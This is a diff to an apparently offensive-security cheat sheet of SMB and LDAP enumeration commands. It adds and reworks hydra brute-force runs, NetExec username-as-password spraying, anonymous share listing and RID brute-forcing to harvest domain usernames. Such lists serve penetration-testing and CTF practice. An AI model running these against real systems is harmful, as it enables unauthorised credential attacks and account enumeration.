@@ -383,10 +383,13 @@ nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' --query "(SA
 godap $TARGET -u '$USERNAME' -p '$PASSWORD'
 
 [*] (445) SMB
-hydra smb2://$TARGET -L usernames -e ns -t35 2>/dev/null | awk '{print $5}' > SMBusernames; (nxc smb "10.10.69.134" -u SMBusernames -p SMBusernames --continue-on-success | grep -vE '[*]|[-]|(Guest)' | sed '1s/^/\n/' | tee SMBspray &)
+hydra smb2://$TARGET -L usernames -e ns -t35 
+nxc smb "$TARGET" -u 'anonymous' -p '' --shares
+nxc smb "$TARGET" -u 'anonymous' -p '' --rid-brute 10000 | grep -oP '(?<=\\)[^ (\n]+(?=.*\(SidTypeUser\))' | tee -a usernames
 
-(nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --rid-brute 10000 | grep -oP '(?<=\\)[^ (\n]+(?=.*\(SidTypeUser\))' | tee -a usernames &)
+
 nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --shares
+nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --rid-brute 10000 | grep -oP '(?<=\\)[^ (\n]+(?=.*\(SidTypeUser\))' | tee -a usernames
 
 smbclient -L //$TARGET -U '$USERNAME'%'$PASSWORD' 2>/dev/null | awk '/-----/{f=1;next} f {print $1}' | awk '{print "use " $1 "\ntree\n\n"}' > SMBcommands; impacket-smbclient /'$USERNAME':'$PASSWORD'@$TARGET -inputfile SMBcommands | grep -vE '[-]|# tree' | sed 's/^[ \t]*//' | tee SMBfiles
 
